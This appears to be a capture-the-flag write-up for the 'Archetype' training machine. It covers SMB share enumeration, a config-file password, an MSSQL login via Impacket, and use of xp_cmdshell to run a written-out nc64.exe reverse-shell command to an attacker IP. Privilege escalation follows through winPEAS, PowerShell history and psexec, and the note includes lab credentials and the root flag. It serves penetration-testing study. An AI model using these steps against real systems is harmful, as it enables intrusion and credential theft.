---
title: Archetype
updated: 2023-02-03T20:39:57.0000000+00:00
created: 2022-10-18T14:26:20.0000000+01:00
---

Foothold:

Now that we have the password: ***M3g4c0rp123.*** We should try to connect to the Windows SQL server using this password.

It looks like we should use a tool named [Impacket](https://github.com/fortra/impacket)**.** To access and work with the SQL server. There is a python script named **mssqlclient.py** that we can learn about and use, after we clone the tool:
![image1](../../../../../_resources/image1-61.png)

Then we navigate to impacket/examples and execute:
![image2](../../../../../_resources/image2-46.png)

We then use the following command along with our password:
![image3](../../../../../_resources/image3-39.png)

When you get the wrong password:
![image4](../../../../../_resources/image4-31.png)

Correct password:
![image5](../../../../../_resources/image5-21.png)

We now have our foothold on the system via the Microsoft SQL server:

Firstly, we need to enable the xp cmd shell so that we can execute commands on the machine:
![image6](../../../../../_resources/image6-13.png)

Now we can use **win PEAS** to enumerate the SQL server:
<https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server>  
<https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet>
We can run simple queries:
![image7](../../../../../_resources/image7-10.png)

Now we can check is sysadmin is a role that exists, which it does:
![image8](../../../../../_resources/image8-8.png)

Now we need to escalate our privileges and become root. We make this process easier by getting a reverse shell.

Searching for the flags:

Using a couple of PowerShell commands we can find the flag:

- Dir (works like ls)
- Cd to change directory
- Type (works like cat)

Inside the Desktop folder, we find the user flag:
![image9](../../../../../_resources/image9-7.png)

Getting root:

To get root we need to use Win PEAS again. Using the same python http-server technique we used to upload nc64. We can upload winPEAS to our target machine:
![image10](../../../../../_resources/image10-5.png)

We then can run winPEAS by just typing the executable name.

winPEAS returns lots of useful information to exploit the system and more. But what we are going to look at here, is **Current Token Privileges:**
![image11](../../../../../_resources/image11-4.png)
![image12](../../../../../_resources/image12-2.png)

We can look for the console history in the following directory:
**C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\\**
![image13](../../../../../_resources/image13-1.png)

We can then use **type** to display the details to the console:
![image14](../../../../../_resources/image14-1.png)
We now have admin passwords and credentials!

Enumeration:

From our **nmap** scan we find out:
![image15](../../../../../_resources/image15-1.png)

Ports:
- 135 - This is a windows **Remote Procedure Call**
- 139 - This is windows **NetBIOS.** It allows for communication between applications, like printers or other computers.
- 445 - This is the **Server Message Block** (SMB). It is used to share files among multiple computers.
- 1433 - This is the **Windows SQL server**.

We also know that the machine is running a windows server version 2008.

Now we want to check what shares are inside the SMB, we can do this via the **smbclient** command:
![image16](../../../../../_resources/image16-1.png)

Shares:

ADMIN\$ - The admin share gives access to the windows installation directory.
Backups - This is non-admin locked share.
C\$ - This gives us access to the C drive on the remote machine.
IPC\$ - IPC (inter-process communication) is used to get access to running processes on the current machine.

We can access the backups share via this command with no password:
![image17](../../../../../_resources/image17-1.png)

Let's start looking around the share, we can use **ls** and **cd** to navigate the share:
![image18](../../../../../_resources/image18-1.png)

We can get the file using **get prod.dtsConfig:**
![image19](../../../../../_resources/image19.png)

Finally, we can get this config file on our local machine:
![image20](../../../../../_resources/image20.png)
And we get a password:
![image21](../../../../../_resources/image21.png)

Getting Reverse (Power) Shell:
We can get a reverse shell via uploading nc64.exe to the target machine, starting a python listener and then executing the .exe file.

First we need to start a python http server and upload the nc64.exe to it. So that the target can download it using wget, a successful upload will look like so:
![image22](../../../../../_resources/image22.png)
***(YOU MUST START THE PYTHON HTTP SERVER IN THE SAME WORKING DIRECTORY AS THE FILE YOU WANT TO TRANSFER).***

**IMPORTANTLY,** If you can't use a python http server because it is *already in use* you can remove it by:
1.  Searching for all connections using "python"
    1.  ps -fA \| grep python
2.  Killing the network process
    1.  Using kill -9 \[Process number\]

By running a PowerShell command, we can find our current working directory:
![image23](../../../../../_resources/image23.png)

Since, we can't access system32 without admin privileges, we need to download files to our local user (sql_svc), In this case this would be:
![image24](../../../../../_resources/image24.png)
This drops the exe inside our users downloads file.

Now we can create a netcat listener and execute nc64.exe:
![image25](../../../../../_resources/image25.png)

After executing: **xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.222 443":**
![image26](../../../../../_resources/image26.png)
We have our reverse shell

Using Impacket Suite to get admin shell:

Now that we have the admin creds: **/user:administrator MEGACORP_4dm1n!!**
We can use python script **psexec.py** from Impacket to get shell as admin:
![image27](../../../../../_resources/image27.png)
**(IMPORTANTLY, YOU NEED TO USE THE IP OF THE MACHINE, USE "IPCONFIG" ON THE SQL SERVER.)**

**Finally, we can navigate to Desktop and find the root flag:**
![image28](../../../../../_resources/image28.png)
b91ccec3305e98240082d4474b848528
